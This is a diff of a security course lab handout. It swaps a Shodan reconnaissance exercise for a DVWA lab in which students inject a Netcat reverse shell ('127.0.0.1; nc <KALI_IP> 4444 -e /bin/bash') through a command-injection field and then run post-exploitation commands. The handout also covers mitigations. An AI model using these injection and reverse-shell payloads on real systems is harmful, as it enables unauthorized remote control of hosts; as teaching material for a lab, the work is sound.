@@ -1,37 +1,43 @@
 
-
-## **INT302: Kali Linux Tools and System Security – Lab 9: Information Gathering with Shodan**
-
----
-
-### **Lab Overview**
-
-In this lab, participants will learn how to use **Shodan**, a powerful search engine for internet-connected devices, to discover exposed systems, services, and potential security risks. The lab provides hands-on experience in identifying publicly accessible infrastructure and understanding the external attack surface of organizations.
+## **INT302: Kali Linux Tools and System Security – Lab 9: Reverse Shell via Netcat Using DVWA Command Execution**
 
 ---
 
-### **Lab Objectives**
+## **Lab Overview**
+
+In this lab, participants will learn how attackers exploit **command execution vulnerabilities** in web applications to gain **remote shell access**. Using **Damn Vulnerable Web Application (DVWA)** and **Netcat**, students will establish a **reverse shell connection** from a vulnerable web server to an attacker machine.
+
+This lab demonstrates real‑world exploitation techniques used during penetration testing and highlights the risks of insecure input handling.
+
+---
+
+## **Lab Objectives**
 
 By the end of this lab, you will be able to:
 
-1. Understand how Shodan indexes internet-connected devices.
-2. Configure and use the Shodan CLI in Kali Linux.
-3. Discover exposed services, ports, and devices using Shodan queries.
-4. Analyze and document findings for security assessments.
+1. Understand how command execution vulnerabilities occur in web applications.
+2. Configure and use Netcat as a listener for reverse shell connections.
+3. Exploit DVWA’s command execution vulnerability to gain shell access.
+4. Verify successful reverse shell connections.
+5. Analyze the security impact of remote command execution vulnerabilities.
 
 ---
 
-### **Tool Used**
+## **Tools Used**
 
-* **Shodan**: A search engine that identifies internet-connected devices, services, and systems using banners, ports, and metadata.
+* **DVWA (Damn Vulnerable Web Application)** – Intentionally vulnerable web application.
+* **Netcat (nc)** – Networking utility for reading/writing network connections.
+* **Kali Linux** – Attacker machine.
+* **Web Browser** – To interact with DVWA.
 
 ---
 
-### **Prerequisites**
+## **Prerequisites**
 
-* Basic understanding of reconnaissance and information gathering.
-* Familiarity with Linux command-line operations.
-* Internet access.
+* DVWA installed and running (local VM or lab network).
+* DVWA security level set to **Low**.
+* Kali Linux with Netcat installed.
+* Basic understanding of TCP/IP and Linux commands.
 
 ---
 
@@ -39,169 +45,201 @@ By the end of this lab, you will be able to:
 
 ---
 
-### **Step 1: Setting Up Shodan**
+## **Step 1: Preparing the Environment**
 
-1. **Create a Shodan Account**
+1. **Start DVWA**
 
-   * Visit the [Shodan website](https://www.shodan.io/) and create an account.
-   * Obtain your **Shodan API key** from your account dashboard.
+   * Ensure Apache/MySQL are running.
+   * Log in to DVWA.
+   * Set DVWA Security Level to **Low**.
 
-2. **Install Shodan CLI**
+2. **Identify Target IP**
 
-   Kali Linux may restrict direct `pip install` for system Python. Use **pipx** or a **Python virtual environment**:
+   * Note the IP address of the DVWA machine.
+   * Example:
 
-   **Option A – Using pipx (recommended):**
-
-   ```bash
-   sudo apt update
-   sudo apt install pipx python3-venv -y
-   pipx install shodan
-   ```
-
-   **Option B – Using a virtual environment:**
-
-   ```bash
-   python3 -m venv ~/shodan-venv
-   source ~/shodan-venv/bin/activate
-   pip install shodan
-   ```
-
-3. **Configure Shodan with Your API Key:**
-
-   ```bash
-   shodan init <YOUR_API_KEY>
-   ```
+     ```
+     http://192.168.204.128/dvwa
+     ```
 
 **Exercise 1:**
 
-* Verify Shodan is correctly configured by running:
-
-  ```bash
-  shodan info
-  ```
-* Record your API plan and query limits. __________
+* Record the DVWA target IP address.
 
 ---
 
-### **Step 2: Basic Shodan Searches**
+---
 
-1. **Search by Domain or Organization Name:**
+## **Step 2: Understanding Command Execution Vulnerability**
 
-   ```bash
-   shodan search example.com
+1. Navigate to:
+
+   ```
+   DVWA → Vulnerabilities → Command Injection
    ```
 
-2. **Search by IP Address:**
+2. Observe the input field used to ping an IP address.
 
-   ```bash
-   shodan host <IP_ADDRESS>
+3. Test normal behavior:
+
+   ```
+   127.0.0.1
+   ```
+
+4. Test command injection:
+
+   ```
+   127.0.0.1; whoami
    ```
 
 **Exercise 2:**
 
-* What information does Shodan reveal about the target (open ports, services, banners)? __________
+* Why does the `whoami` command execute successfully?
 
 ---
 
-### **Step 3: Service and Port Enumeration**
+---
 
-1. **Search for Specific Services:**
+## **Step 3: Setting Up Netcat Listener (Attacker Side)**
 
-   ```bash
-   shodan search port:22
-   ```
+1. On **Kali Linux**, start a Netcat listener:
 
-2. **Search for Web Servers:**
+```bash
+nc -lvnp 4444
+```
 
-   ```bash
-   shodan search port:80
-   ```
+2. Ensure:
 
-3. **Search for Databases Exposed to the Internet:**
-
-   ```bash
-   shodan search port:3306
-   ```
+   * Port `4444` is not blocked
+   * Kali IP address is reachable from DVWA
 
 **Exercise 3:**
 
-* Identify at least two services exposed on the internet and explain why they could pose a security risk. __________
+* What is the purpose of running Netcat in listening mode?
 
 ---
 
-### **Step 4: Advanced Shodan Queries**
+---
 
-1. **Country-Based Search:**
+## **Step 4: Crafting the Reverse Shell Payload**
 
-   ```bash
-   shodan search country:NG
-   ```
+1. Use the following **Netcat reverse shell payload**:
 
-2. **Filter by Organization:**
+```bash
+nc <KALI_IP> 4444 -e /bin/bash
+```
 
-   ```bash
-   shodan search org:"Organization Name"
-   ```
+> Replace `<KALI_IP>` with your Kali Linux IP address.
 
-3. **Multiple Filters Combined:**
+2. Inject the payload into DVWA’s command execution input:
 
-   ```bash
-   shodan search port:443 country:US
-   ```
+```bash
+127.0.0.1; nc <KALI_IP> 4444 -e /bin/bash
+```
+
+3. Submit the request.
+
+---
+
+## **Step 5: Verifying Reverse Shell Connection**
+
+1. Return to the Kali terminal.
+2. Observe the incoming connection.
+
+Example:
+
+```
+connect to [192.168.x.x] from (UNKNOWN) [192.168.x.x]
+```
+
+3. Run shell commands:
+
+```bash
+whoami
+id
+uname -a
+```
 
 **Exercise 4:**
 
-* Perform a search using at least two filters. Document the devices and services discovered. __________
+* What user account is the reverse shell running as?
 
 ---
 
-### **Step 5: Identifying Security Exposure**
+---
 
-1. **Search for Commonly Exposed Devices:**
+## **Step 6: Post‑Exploitation Validation**
 
-   * Routers
-   * CCTV cameras
-   * Industrial control systems (ICS)
-   * IoT devices
+1. Confirm system access:
 
-   Example:
+```bash
+pwd
+ls
+ifconfig
+```
 
-   ```bash
-   shodan search "webcam"
-   ```
+2. Determine privilege level:
 
-2. **Analyze Service Banners**
+```bash
+id
+```
 
-   * Review version numbers.
-   * Identify outdated or vulnerable software.
+3. Identify OS details:
+
+```bash
+cat /etc/os-release
+```
 
 **Exercise 5:**
 
-* Identify one potentially vulnerable system and explain why it may be at risk. __________
+* Why is a reverse shell more powerful than simple command execution?
 
 ---
 
-### **Step 6: Reporting and Analysis**
+---
 
-1. **Document Findings**
-
-   * Target searched
-   * Query used
-   * Services discovered
-   * Potential security implications
-
-2. **Ethical Considerations**
-
-   * Discuss why Shodan should only be used for **defensive security, research, and authorized assessments**.
+## **Step 7: Security Impact and Risk Analysis**
 
 **Exercise 6:**
+Answer the following:
 
-* Explain how Shodan findings can be useful during a penetration testing or blue team engagement. __________
+* What could an attacker do with persistent shell access?
+* How could this vulnerability lead to full system compromise?
+* Why is command execution considered a critical vulnerability?
 
 ---
 
-### **Conclusion**
+---
 
-In this lab, you gained practical experience using **Shodan** to discover internet-exposed systems and services. You learned how attackers and defenders alike can use publicly available data to understand an organization’s external attack surface and improve security posture.
+## **Step 8: Mitigation and Defense**
+
+1. Discuss secure coding practices:
+
+   * Input validation
+   * Command whitelisting
+   * Use of safe APIs
+   * Web Application Firewalls (WAF)
+
+**Exercise 7:**
+
+* List three defensive controls that would prevent this attack.
+
+---
+
+---
+
+## **Conclusion**
+
+In this lab, you successfully exploited a **command execution vulnerability** in DVWA to obtain a **reverse shell using Netcat**. You learned how attackers transition from web‑level access to system‑level control and why such vulnerabilities pose a severe security risk.
+
+---
+
+## **Deliverables**
+
+Students must submit:
+
+* Screenshots of Netcat listener and reverse shell
+* Answers to all exercises
+* A brief explanation of how the reverse shell was achieved
 
 ---
